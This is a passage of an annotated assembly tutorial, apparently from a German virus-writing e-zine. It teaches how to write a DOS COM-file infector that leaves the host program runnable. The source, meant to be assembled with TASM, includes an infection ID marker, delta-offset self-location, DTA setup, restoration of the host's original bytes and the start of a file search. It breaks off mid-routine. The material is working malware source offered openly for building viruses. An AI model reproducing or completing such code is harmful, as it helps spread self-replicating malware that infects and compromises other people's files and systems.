;I write this tutorial hoping that more people understand how viruses work
;
;I think that the best way to learn viruswriting is a good commented piece
;  of Source  ;)
;
;Now when you finally understand my first tutorial (i hope) let's come
;  to the second one. The COM-Files which would be infected by our first
;  virus get so bad damaged so that you couldn't run the orginal program
;  any longer. That's of course not our goal. So we have to try to infect
;  a COM so we can run the orginal program as long as we want to do.
;
;Sorry, that the labels are written in german but i am german and this
;  tutorial is just translated from german to english for the Kefrens
;  E-Zine ;)
;
;You can assemble this file with TASM:
;   tasm tut2e.asm
;   tlink tut2e.obj /t

;
;Let's go:

jumps

code segment
assume cs:code,ds:code

org 0100h
;We know this part ;)

infectedfile:

db 0e9h, 02h, 0h
;that's noting else as "jmp far tutnichts"
db 0deh, 0adh
;This is our ID. Our Virus should know that this file is already infected.

tutnichts:
        call virus
;call saves the location where it is used (=begin of our virus) in the STACK

virus:
        pop     bp
;with POP you can pop things out of the STACK into a register
;"call virus" saved our virus location into the STACK. Now we save this
;  location in BP
;  now BP is the location where we can find our virus
        sub     bp, OFFSET virus
;now we subtract the offset of "virus" from bp
;  we just want to know where our virus is not where our virus + the orginal
;  bytes are ;)

dtasetzen:
        mov     ah, 1ah
        lea     dx, [bp+OFFSET dta]
        int     21h
;ah=1ah sets the DTA (Disk Transfer Area) to the location dx
;  in the DTA all important parts for DOS are saved (filesize, attributes
;     filetime, filedate etc.)
;When we save the DTA in our virus it's easier to use it  ;)

        mov     cx, 5
        lea     si, [bp+OFFSET zweibytes1]
        mov     di, 100h
        rep     movsb
;Good that all COM-Files start at 100h in our memory
;We had replaced the first 5 bytes of the orginal file with a jump to our 
;  virus (3bytes) and an ID (2byte)
;  Before that we had saved the orginal bytes because the program needs them.
;Here he move CX bytes from SI to DI
;  that means: we write the 5 saved bytes from the orginal program back to
;     the front of our infectect file.
;Of course we just restore them in the memory ;)

        mov     ah, 4eh

;We know this part, too. Only difference is that the DTA now is in our virus
;  otherwise dta would be at the position 80h that means that dx would be 09eh
